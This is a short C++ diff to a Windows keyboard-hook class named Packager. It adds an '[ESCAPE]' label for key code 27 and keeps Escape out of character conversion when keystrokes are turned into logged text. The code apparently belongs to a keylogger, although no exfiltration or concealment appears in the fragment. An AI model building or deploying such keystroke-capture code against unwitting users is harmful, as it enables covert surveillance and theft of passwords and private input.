@@ -30,6 +30,7 @@ Packager::Packager()
 	correspondance[35] = "[END]";
 	correspondance[8] = "[BACKSPACE]";
 	correspondance[13] = "[ENTER]";
+	correspondance[27] = "[ESCAPE]";
 	correspondance[38] = "[UP]";
 	correspondance[40] = "[DOWN]";
 	correspondance[37] = "[LEFT]";
@@ -83,7 +84,7 @@ void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 		str += (_alt ? "[ALT] " : "");
 		str += (_altGr ? "[ALT GR] " : "");
 
-		if ((info->vkCode != 13 && info->vkCode != 8) && (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0)) {
+		if ((info->vkCode != 13 && info->vkCode != 8 && info->vkCode != 27) && (ToUnicode(info->vkCode, info->scanCode, kbdState, buff, 2, 0) > 0)) {
 			std::wstring ws(buff);
 			str.append(ws.begin(), ws.end());
 		}
